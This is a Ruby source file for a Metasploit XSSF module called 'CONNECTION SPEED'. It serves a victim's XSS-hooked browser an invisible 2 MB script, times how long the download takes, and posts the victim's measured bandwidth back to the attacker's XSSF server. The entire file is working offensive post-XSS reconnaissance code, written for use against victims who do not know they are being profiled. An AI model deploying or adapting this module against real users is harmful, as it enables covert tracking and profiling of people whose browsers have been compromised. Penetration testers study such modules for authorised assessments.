require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
# http://www.ehow.com/how_5804819_detect-connection-speed-javascript.html
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'CONNECTION SPEED',
			'Description' => 'Returns victim\'s connection speed'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		if (req.uri =~ /myscript\.js/i)
			send_response(cli, 'A' * 2000000, {'Content-Type' => 'text/javascript'})		# Sending 2Mo (approx)
		else
			code = %Q{
				<html>
				<body>
					<script>
						var startTime 	= (new Date()).getTime();
						var downloadSize= 2000000;
						
						function send_response() {
							var duration = Math.round(((new Date()).getTime() - startTime) / 1000) ;
							var bitsLoaded = downloadSize * 8 ;
							var speedBps = Math.round(bitsLoaded / duration) ;
							var speedKbps = (speedBps / 1024).toFixed(2) ;
							var speedMbps = (speedKbps / 1024).toFixed(2) ;
							XSSF_POST("Connection speed is: \\n" + speedBps + " bps\\n" + speedKbps + " kbps\\n" + speedMbps + " Mbps\\n", '#{self.name}') ;
						}
					</script>
					
					<script src="/myscript.js?d=#{Rex::Text.rand_text_alphanumeric(rand(10) + 5)}" style="display:none;" onload="send_response();" ></script>
				</body>
				</html>
			}
			send_response(cli, code)
		end
	end
end
